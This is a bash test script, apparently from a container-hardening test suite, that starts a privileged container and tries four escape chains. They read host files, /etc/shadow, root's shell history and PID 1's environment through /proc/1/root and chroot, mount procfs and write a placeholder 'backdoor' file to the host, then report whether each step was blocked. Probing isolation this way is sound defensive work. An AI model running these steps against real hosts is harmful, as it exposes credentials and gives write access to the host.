#!/bin/bash

set -Eeuo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
REPO_ROOT="$(cd -- "$SCRIPT_DIR/../../../.." && pwd -P)"
source "$REPO_ROOT/src/execute/test-runner-common.sh"

RUNTIME_ENGINE="${RUNNER_RUNTIME_ENGINE:-docker}"
TC17_RESULTS_DIR="${RUNNER_ARTIFACTS_DIR:-$TEST_RESULTS_DIR}"
mkdir -p "$TC17_RESULTS_DIR"
tc17_result_targets=("${TC17_RESULTS_DIR}/tc17-results.txt")
if [ -n "${RUNNER_ARTIFACTS_DIR:-}" ] && [ "$TEST_RESULTS_DIR" != "$RUNNER_ARTIFACTS_DIR" ]; then
    tc17_result_targets+=("${TEST_RESULTS_DIR}/tc17-results.txt")
fi

echo "--- TC17: Combined Weakness Probe ---"
echo "Date: $(date -Iseconds)"
echo "Runtime: ${RUNTIME_ENGINE}"
echo ""

helper_image="$(resolve_helper_image "alpine-shell" 2>/dev/null || echo "alpine")"

{
"${RUNTIME_ENGINE}" run --rm -i \
    --pid=host \
    --cap-add=SYS_ADMIN \
    --cap-add=SYS_CHROOT \
    --cap-add=SYS_PTRACE \
    --cap-add=DAC_OVERRIDE \
    --security-opt label=level:s0:c100,c200 \
    "$helper_image" sh -c '
echo "=== CHAIN A: PID+SYS_ADMIN -> host FS ==="
echo "Step 1: Host PID namespace gives visibility to host processes"
ls /proc/1/cmdline 2>/dev/null && echo "  [+] Host PID 1 visible: $(cat /proc/1/cmdline | tr '\''\0'\'' '\'' '\'')"
echo "Step 2: CAP_SYS_ADMIN allows mounting host root via /proc/1/root"
if cat /proc/1/root/etc/hostname 2>/dev/null; then
    echo "  [+] CHAIN SUCCEEDED: Read host /etc/hostname via /proc/1/root"
else
    echo "  [-] CHAIN BLOCKED: Cannot traverse /proc/1/root"
fi
echo "Step 3: Attempt to write to host filesystem"
echo "chain-a-marker-$(date +%s)" > /proc/1/root/tmp/.tc17_chain_test 2>/dev/null && \
    echo "  [+] CHAIN SUCCEEDED: Wrote to host /tmp" && \
    rm -f /proc/1/root/tmp/.tc17_chain_test || \
    echo "  [-] CHAIN BLOCKED: Write to host /tmp denied"

echo ""
echo "=== CHAIN B: SYS_PTRACE+PID -> process injection ==="
echo "Step 1: Enumerate host processes"
ps aux 2>/dev/null | head -5 || ls /proc/*/comm 2>/dev/null | head -10
echo "Step 2: Read host process environment (info leak)"
cat /proc/1/environ 2>/dev/null | tr '\''\0'\'' '\''\n'\'' | head -5 && \
    echo "  [+] CHAIN SUCCEEDED: Host PID 1 environ readable" || \
    echo "  [-] CHAIN BLOCKED: Cannot read host process environ"
echo "Step 3: Attempt ptrace attach to host process"
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null && \
    echo "  [i] Yama ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope)" || \
    echo "  [i] Cannot read ptrace_scope"

echo ""
echo "=== CHAIN C: SYS_CHROOT+DAC_OVERRIDE -> chroot escape ==="
echo "Step 1: Create nested chroot environment"
mkdir -p /tmp/chroot_test 2>/dev/null
echo "Step 2: Attempt chroot to /proc/1/root (host root)"
chroot /proc/1/root /bin/cat /etc/shadow 2>/dev/null && \
    echo "  [+] CHAIN SUCCEEDED: Read host /etc/shadow via chroot" || \
    echo "  [-] CHAIN BLOCKED: Chroot to host root denied"
echo "Step 3: DAC_OVERRIDE - read protected files directly"
cat /proc/1/root/etc/shadow 2>/dev/null && \
    echo "  [+] DAC_OVERRIDE effective: host shadow readable" || \
    echo "  [-] DAC_OVERRIDE blocked in this context"

echo ""
echo "=== CHAIN D: Full combination (mount+chroot+ptrace+read) ==="
echo "Step 1: Mount new procfs for redundant host view"
mkdir -p /mnt
mount -t proc proc /mnt 2>/dev/null && \
    echo "  [+] SYS_ADMIN: procfs mount succeeded" || \
    echo "  [-] procfs mount blocked"
echo "Step 2: Combined traversal attempt"
for target in /etc/shadow /etc/hostname /root/.bash_history; do
    if cat /proc/1/root${target} 2>/dev/null; then
        echo "  [+] HOST FILE READ: ${target}"
    else
        echo "  [-] Blocked: ${target}"
    fi
done
echo "Step 3: Attempt to install backdoor on host"
echo "#!/bin/sh" > /proc/1/root/tmp/.tc17_backdoor 2>/dev/null && \
    echo "  [+] CRITICAL: Backdoor written to host" && \
    rm -f /proc/1/root/tmp/.tc17_backdoor || \
    echo "  [-] Backdoor write blocked"

umount /mnt 2>/dev/null || true
rmdir /tmp/chroot_test 2>/dev/null || true
'

echo ""
echo "=== TC17 SUMMARY ==="
echo "Weaknesses enabled: PID=host, CAP_SYS_ADMIN, CAP_SYS_CHROOT, CAP_SYS_PTRACE, CAP_DAC_OVERRIDE"
echo "Chains tested: A(PID+mount), B(ptrace+PID), C(chroot+DAC), D(full combination)"
echo "Any [+] result indicates the weakness combination enables escalation"
echo "All [-] results indicate controls still effective despite multiple weaknesses"
} 2>&1 | tee "${tc17_result_targets[@]}"

echo "TC17 combined-weakness probe completed"
